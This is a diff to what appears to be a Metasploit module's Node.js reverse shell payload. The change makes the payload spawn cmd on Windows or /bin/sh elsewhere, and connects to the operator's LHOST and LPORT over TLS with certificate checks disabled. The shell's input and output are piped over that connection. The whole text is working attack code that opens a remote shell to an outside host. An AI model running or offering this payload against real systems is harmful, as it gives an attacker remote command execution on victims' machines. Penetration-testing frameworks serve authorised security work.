@@ -51,12 +51,13 @@ module Metasploit3
 (function(){
   var require = global.require || global.process.mainModule.constructor._load;
   if (!require) return;
+  var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh";
   var tls = require("tls"),
-      spawn = require("child_process").spawn,
+      cp = require("child_process"),
       util = require("util"),
-      sh = spawn("/bin/sh", []);
+      sh = cp.spawn(cmd, []);
   var client = this;
-  client.socket = tls.connect(#{datastore['LPORT']}, "#{lhost}", function() {
+  client.socket = tls.connect(#{datastore['LPORT']}, "#{lhost}", {rejectUnauthorized:false}, function() {
     client.socket.pipe(sh.stdin);
     util.pump(sh.stdout, client.socket);
     util.pump(sh.stderr, client.socket);
